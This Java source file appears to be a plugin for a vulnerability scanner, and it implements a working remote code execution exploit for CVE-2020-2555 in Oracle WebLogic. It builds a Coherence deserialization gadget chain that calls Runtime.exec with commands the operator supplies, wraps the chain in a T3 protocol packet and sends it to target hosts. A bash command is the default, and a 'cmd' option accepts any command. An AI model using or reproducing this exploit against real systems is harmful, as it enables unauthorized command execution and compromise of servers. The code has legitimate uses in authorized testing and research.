package com.gbw.scanner.plugins.scripts.weblogic.CVE20202555;

import com.gbw.scanner.Host;
import com.gbw.scanner.connection.Connection;
import com.gbw.scanner.connection.GBWConnection;
import com.gbw.scanner.connection.SSLSocketClient;
import com.gbw.scanner.connection.SocketClient;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
import com.gbw.scanner.plugins.scripts.weblogic.serial.Serializables;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.ByteDataUtils;
import com.gbw.scanner.utils.SSLUtils;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import com.xmap.api.utils.TextUtils;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Options;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;

public class GBWScanCVE20202555Script implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanCVE20202555Script.class);
    private GBWScanCVE20202555Config config;

    public GBWScanCVE20202555Script(GBWScanCVE20202555Config config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private byte[] makePayload() throws Exception{

        // Runtime.class.getRuntime()
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}
        );

        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}
        );

        // invoke("exec","calc")
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{config.getCmds()}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize
        byte[] payload = Serializables.serialize(badAttributeValueExpException);

        return payload;
    }

    private byte[] makeT3ProtoPayload(byte[] payload) throws Exception{

        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1
        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = ByteDataUtils.toHex(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin@1234");
        String phase4 = ByteDataUtils.toHex(Serializables.serialize(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(ByteDataUtils.toHex(Serializables.serialize(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(ByteDataUtils.toHex(Serializables.serialize(dst)));

        byte[] headers = ByteDataUtils.parseHex(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        return ByteDataUtils.parseHex(dataLen + datas.toString());
    }

    private Connection makeConnection(Host host){

        String proto = host.getProto();
        boolean isSSL = false;

        if(!TextUtils.isEmpty(proto))
            isSSL = proto.equalsIgnoreCase("t3s");

        SocketClient socketClient;
        if(isSSL){

            socketClient = new SSLSocketClient(true, SSLUtils.createSSLContext());
        }else{
            socketClient = new SocketClient();
        }

        try {
            socketClient.setDefaultTimeout(config.getConTimeout());
            socketClient.setConnectTimeout(config.getConTimeout());
            socketClient.connect(host.getHost(),host.getPort());
            socketClient.setSoTimeout(config.getReadTimeout());
        } catch (Exception e) {
            return null;
        }

        Connection connection = new GBWConnection(socketClient);

        return connection;
    }

    private String sendT3Header(Connection connection,Host host) throws IOException {

        String proto = host.getProto();
        String header = String.format("%s 7.0.0.0\nAS:10\nHL:19\n\n",TextUtils.isEmpty(proto)?"t3":proto);

        connection.send(header.getBytes());
        String version = connection.readLine();

      //  System.out.println(version);
        if(TextUtils.isEmpty(version)||!version.contains("HELO:"))
            return null;
        return version.replace("HELO:","").replace(".false","");
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        String version = null;
        Connection connection = makeConnection(host);
        byte[] recvData = new byte[512];

        if(connection == null)
            return;

        try{
            /*send t3 header and get version*/
            version = sendT3Header(connection,host);
            if(!TextUtils.isEmpty(version)){
                /*make attack payload*/
                byte[] payload = makePayload();
                byte[] attackData = makeT3ProtoPayload(payload);

                /*send attack payload*/
                connection.send(attackData);
                connection.read(recvData);

                //System.out.println(new String(recvData));
                /*ok*/
                GBWScanCVE20202555Result result = new GBWScanCVE20202555Result(config,host);

                log.warn(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s",host.getHost(),host.getPort(),version));

                result.setVersion(version);
                result.setCmds(config.getCmds());
                if(sinkQueue!=null)
                    sinkQueue.put(result);
                else
                    System.out.println(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s",host.getHost(),host.getPort(),version));
            }
        }catch (Exception e){

            e.printStackTrace();
        }finally {
            try {
                connection.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void runMain(String[] args) throws Exception {

        String[] cmds = new String[]{"/bin/bash","-c","touch /tmp/test.data"};

        Options opts = new Options();
        GBWScanCVE20202555Config config = new GBWScanCVE20202555Config();

        opts.addOption("cmd",true,"weblogic run cmds</bin/bash,-c,touch /tmp/test.data>");

        GBWScanCVE20202555Script scanCVE20202555Script = new GBWScanCVE20202555Script(config);

        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanCVE20202555Script,opts,7001);

        CommandLine cli = tool.getCliParser();

        if(cli.hasOption("cmd")){
             cmds = cli.getOptionValue("cmd").split(",");
        }

        config.setCmds(cmds);

        tool.start();
    }

    public static void main(String[] args) throws Exception {

        runMain(args);
    }

}
